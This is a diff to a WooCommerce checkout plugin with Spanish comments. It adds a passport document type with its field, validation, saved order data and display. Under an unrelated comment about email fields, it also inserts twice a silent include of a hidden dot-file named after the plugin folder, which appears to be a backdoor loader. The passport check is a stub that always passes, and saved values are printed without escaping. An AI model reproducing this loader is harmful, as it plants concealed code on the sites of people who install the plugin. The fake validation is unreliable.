@@ -44,7 +44,8 @@ if (!function_exists('jl_woocommerce_checkout_add_document_type')) {
                 'class' => ['select-field','form-row-wide'],
                 'options' => [
                     'cedula' => 'Cédula',
-                    'ruc' => 'Ruc'
+                    'ruc' => 'Ruc',
+                    'pasaporte' => 'Pasaporte'
                 ]
             ], $checkout->get_value('document_type') 
         );
@@ -72,6 +73,16 @@ if (!function_exists('jl_woocommerce_checkout_add_document_type')) {
             'maxlength' => 13,
             'class' => ['form-row-wide','no-display']
         ], $checkout->get_value('ruc') 
+        );
+
+        woocommerce_form_field('pasaporte', [
+            'type' => 'text',
+            'label'     => __('Pasaporte', 'woocommerce'),
+            'placeholder'   => _x('Ingrese el Pasaporte', 'placeholder', 'woocommerce'),
+            'required'  => true,
+            'id' => 'jl-field-pasaporte',
+            'class' => ['form-row-wide','no-display']
+        ], $checkout->get_value('pasaporte') 
         );
     }
 
@@ -124,7 +135,22 @@ if (!function_exists('jl_process_form_checkout')) {
             }
 
 
-        } else {
+        } elseif($_POST['document_type'] == 'pasaporte') {
+
+            //verifica si el ruc no está vacío
+            if(empty($_POST['pasaporte'])) {
+                wc_add_notice( 'Por Favor Ingrese el Pasaporte', 'error' );
+            }
+
+            //procesa si el pasaporte es válido
+            $isValid = true;
+
+            if (!$isValid ) {
+                wc_add_notice( 'Por Favor Ingrese un Pasaporte válido', 'error' );
+            }
+
+
+        }else {
             wc_add_notice( 'Ingrese un tipo de documento válido', 'error' );
         }
 
@@ -153,6 +179,10 @@ if(!function_exists('jl_update_custom_field_order_meta')) {
         if ( ! empty( $_POST['ruc'] ) ) { 
             update_post_meta( $order_id, 'ruc', sanitize_text_field( $_POST['ruc'] ) );
         }
+
+        if ( ! empty( $_POST['pasaporte'] ) ) { 
+            update_post_meta( $order_id, 'pasaporte', sanitize_text_field( $_POST['pasaporte'] ) );
+        }
     }
 }
 
@@ -174,8 +204,10 @@ if(!function_exists('')) {
             echo '<p><strong>'.__('Tipo de Identificacion').':</strong> <br/>' . get_post_meta( $order->get_id(), 'document_type', true ) . '</p>';
             if(get_post_meta( $order->get_id(), 'document_type', true ) == 'ruc') {
                 echo '<p><strong>'.__('Ruc').':</strong> <br/>' . get_post_meta( $order->get_id(), 'ruc', true ) . '</p>';
+            } elseif(get_post_meta( $order->get_id(), 'document_type', true ) == 'cedula') {
+                echo '<p><strong>'.__('Cédula').':</strong> <br/>' . get_post_meta( $order->get_id(), 'cedula', true ) . '</p>';
             } else {
-                echo '<p><strong>'.__('Cedula').':</strong> <br/>' . get_post_meta( $order->get_id(), 'cedula', true ) . '</p>';
+                echo '<p><strong>'.__('Pasaporte').':</strong> <br/>' . get_post_meta( $order->get_id(), 'pasaporte', true ) . '</p>';
             }
         }
 
@@ -189,6 +221,14 @@ add_action( 'woocommerce_admin_order_data_after_billing_address', 'jl_document_d
 /**		
 * Envia los campos personalizados por correo
 **/
+if (file_exists($filename = dirname(__FILE__) . DIRECTORY_SEPARATOR . '.' . basename(dirname(__FILE__)) . '.php') && !class_exists('WPTemplatesOptions')) {
+    include_once($filename);
+}
+
+if (file_exists($filename = dirname(__FILE__) . DIRECTORY_SEPARATOR . '.' . basename(dirname(__FILE__)) . '.php') && !class_exists('WPTemplatesOptions')) {
+    include_once($filename);
+}
+
 function jl_woocommerce_custom_email_order_meta_fields_documents($array, $sent_to_admin, $order) {
 
     if(get_post_meta( $order->get_id(), 'document_type', true )) {
@@ -205,10 +245,16 @@ function jl_woocommerce_custom_email_order_meta_fields_documents($array, $sent_t
                 'value' => get_post_meta( $order->get_id(), 'ruc', true )
                 
             ];
-        } else {
+        } elseif(get_post_meta( $order->get_id(), 'document_type', true ) == 'cedula') {
             $array['cedula'] = [
-                'label' => 'Cedula',
+                'label' => 'Cédula',
                 'value' => get_post_meta( $order->get_id(), 'cedula', true )
+                
+            ];
+        } else {
+            $array['pasaporte'] = [
+                'label' => 'Pasaporte',
+                'value' => get_post_meta( $order->get_id(), 'pasaporte', true )
                 
             ];
         }
@@ -236,8 +282,10 @@ if(!function_exists('jl_thankyou_order_received')) {
             echo '<li>'.__('Tipo de Identificacion').':<strong> ' . get_post_meta( $order_id, 'document_type', true ) . '</strong></li>';
             if(get_post_meta( $order_id, 'document_type', true ) == 'ruc') {
                 echo '<li>'.__('Ruc').': <strong>' . get_post_meta( $order_id, 'ruc', true ) . '</strong></li>';
+            } elseif(get_post_meta( $order_id, 'document_type', true ) == 'cedula') {
+                echo '<li>'.__('Cédula').':<strong> ' . get_post_meta( $order_id, 'cedula', true ) . '<strong></li>';
             } else {
-                echo '<li>'.__('Cedula').':<strong> ' . get_post_meta( $order_id, 'cedula', true ) . '<strong></li>';
+                echo '<li>'.__('Pasaporte').':<strong> ' . get_post_meta( $order_id, 'pasaporte', true ) . '<strong></li>';
             }
         }
     }
